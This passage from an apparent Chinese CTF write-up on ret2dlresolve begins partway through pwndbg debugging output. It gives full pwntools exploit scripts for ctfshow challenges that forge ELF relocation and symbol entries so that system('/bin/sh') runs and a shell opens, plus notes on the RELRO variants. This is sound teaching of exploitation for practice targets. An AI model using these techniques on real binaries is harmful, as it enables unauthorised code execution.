l_next = 0xf7f0dc30, </span><br><span class="line">  l_prev = 0x0, </span><br><span class="line">  l_real = 0xf7f0d940, </span><br><span class="line">  l_ns = 0, </span><br><span class="line">  l_libname = 0xf7f0dc20, </span><br><span class="line">  l_info = &#123;0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 &lt;repeats 13 times&gt;, 0x8049fbc, 0x0 &lt;repeats 25 times&gt;, 0x8049f44&#125;, </span><br><span class="line">  l_phdr = 0x8048034, </span><br><span class="line">  l_entry = 134513632, </span><br><span class="line">  l_phnum = 9, </span><br><span class="line">  l_ldnum = 0, </span><br><span class="line">  l_searchlist = &#123;</span><br><span class="line">    r_list = 0xf7edf3e0, </span><br><span class="line">    r_nlist = 3</span><br><span class="line">  &#125;, </span><br><span class="line">  l_symbolic_searchlist = &#123;</span><br><span class="line">    r_list = 0xf7f0dc1c, </span><br><span class="line">    r_nlist = 0</span><br><span class="line">  &#125;, </span><br><span class="line">  l_loader = 0x0, </span><br><span class="line">  l_versions = 0xf7edf3f0, </span><br><span class="line">  l_nversions = 3, </span><br></pre></td></tr></table></figure><p>对应的分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *((struct r_found_version[3] *)0xf7edf3f0)</span><br><span class="line">$13 = &#123;&#123;</span><br><span class="line">    name = 0x0, </span><br><span class="line">    hash = 0, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x0</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    name = 0x0, </span><br><span class="line">    hash = 0, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x0</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    name = 0x80482be &quot;GLIBC_2.0&quot;, </span><br><span class="line">    hash = 225011984, </span><br><span class="line">    hidden = 0, </span><br><span class="line">    filename = 0x804826d &quot;libc.so.6&quot;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print /x 0xf7edf3f0+0x442C*16</span><br><span class="line">$16 = 0xf7f236b0</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32</span><br><span class="line">0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7ec1000 0xf7ec4000 rw-p     3000 0      </span><br><span class="line">0xf7edf000 0xf7ee1000 rw-p     2000 0      </span><br><span class="line">0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]</span><br></pre></td></tr></table></figure><p>而在动态解析符号地址的过程中，如果 version 为 NULL 的话，也会正常解析符号。</p><p>与此同，根据上面的调试信息，可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求，我们来在 080487A8 下方找一个合适的值。可以发现 0x080487C2 处的内容为 0。</p><p>那自然的，我们就可以调用目标函数。</p><p>这里，我们可以通过调整 base_stage 来达到相应的目的。</p><ul><li>首先 0x080487C2 与 0x080487A8 之间差了 0x080487C2-0x080487A8)&#x2F;2 个 version 记录。</li><li>那么，这也就说明原先的符号表偏移少了对应的个数。</li><li>因此，我们只需要将 base_stage 增加 (0x080487C2-0x080487A8)&#x2F;2*0x10，即可达到对应的目的。</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size + <span class="built_in">int</span>((<span class="number">0x080487C2</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>*<span class="number">0x10</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>最终能正常输出</p><h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><p>这一阶段，我们将在4的基础上，进一步伪造write符号的st_name指向我们自己构造的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size + <span class="built_in">int</span>((<span class="number">0x080487C2</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>*<span class="number">0x10</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = fake_sym_addr + <span class="number">0x10</span> -dynstr<span class="comment"># 因为 Elf32_Sym 的大小是16，所以加0x10(--&gt;b&#x27;write\x00&#x27;)</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;write\x00&#x27;</span>)<span class="comment">#str_name</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>能够正常输出</p><h4 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h4><p>这一次我们只用将原先的write字符改为system字符串，同时修改write的参数为system的参数即可获得shell，因为<code>_dl_runtime_resolve</code>函数最终是依赖函数名来解析目标地址的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28217)</span></span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./2.so&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size + <span class="built_in">int</span>((<span class="number">0x080487C2</span>-<span class="number">0x080487A8</span>)/<span class="number">2</span>*<span class="number">0x10</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>,base_stage,<span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#0x80483c0</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#0x08048324</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">index_offset = (base_stage+<span class="number">24</span>) - rel_plt <span class="comment">#base_stage + 24指向fake_reloc</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line"><span class="built_in">print</span>(align)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align<span class="comment">#这里是为了对齐，因为dynsym里的Elf32_Sym结构体都是0x10字节大小的</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">r_info = (<span class="built_in">int</span>(index_dynsym) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#r_info的低8位要是7保证通过检查R_386_JUMP_SLOT=7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">str_name = fake_sym_addr + <span class="number">0x10</span> -dynstr<span class="comment"># 因为 Elf32_Sym 的大小是16，所以加0x10(--&gt;b&#x27;write\x00&#x27;)</span></span><br><span class="line">fake_sym = p32(str_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) +p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(fake_reloc)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">b&#x27;system\x00&#x27;</span>)<span class="comment">#str_name</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>成功获得了shell</p><p>NO_RELRO的情况下我们是直接改.dynamic的strtab将其指向我们构造的.dynstr表</p><p>Partial RELRO的情况下我们是通过伪造一整个重定位表项的方式来调用目标函数。</p><h3 id="基于工具伪造"><a href="#基于工具伪造" class="headerlink" title="基于工具伪造"></a>基于工具伪造</h3><p><del>有了工具是真的方便，虽然这个漏洞已经很久远了</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"><span class="comment"># pwntools will help us choose a proper addr</span></span><br><span class="line"><span class="comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">payload = flat(&#123;<span class="number">112</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><p>在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。</p><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>ctfshow pwn 84</p><p>和32位差不多栈迁移到bss段上在bss段上伪造字符串表，将其中的read字符串替换为system字符串，直接修改.dynamic的strtab将其指向我们构造的.dynstr表</p><ol><li>在 bss 段伪造栈。栈中的数据为<ol><li>修改 .dynamic 节中字符串表的地址为伪造的地址</li><li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li><li>在特定的位置读取 &#x2F;bin&#x2F;sh 字符串。</li><li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li></ol></li><li>栈迁移到 bss 段。</li></ol><p>由于没有pop rdx我们使用万能gadget <code>_libc_csu</code>控制rdx的值</p><p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-29_13-18-34.png" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 